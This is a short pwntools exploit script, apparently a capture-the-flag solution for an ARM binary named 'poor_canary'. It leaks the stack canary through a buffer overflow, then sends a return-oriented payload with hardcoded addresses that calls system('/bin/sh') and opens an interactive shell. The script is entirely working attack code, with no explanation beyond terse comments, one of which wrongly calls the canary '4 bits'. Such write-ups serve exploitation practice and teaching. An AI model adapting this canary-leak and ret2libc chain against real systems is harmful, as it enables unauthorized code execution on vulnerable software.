from pwn import * 


p = process("./poor_canary")

p.recvuntil(">")

def leak_canary():
  junk = 'a'*41
  p.send(junk)
  p.recvuntil(junk)
  canary = p.recv(3) #canary=4 bits, but one is \x00
  canary = u32("\x00"+canary)
  return canary

canary = leak_canary()

log.success("Leak canary.......")
log.success("Canary: "+hex(canary))

system = 0x0016d90      #<__libc_system>:
bin_sh = 0x00071eb0     #: /bin/sh 

pop_r0_r4_pc = 0x00026b7c #: pop {r0, r4, pc}

p.recvuntil(">")

payload = ''
payload += 'a' * 40
payload += p32(canary)  
payload += 'a'*12       #0x10-4  
payload += p32(pop_r0_r4_pc)
payload += p32(bin_sh)
payload += 'xxxx'
payload += p32(system)

p.sendline(payload)
p.sendline("")
p.interactive()

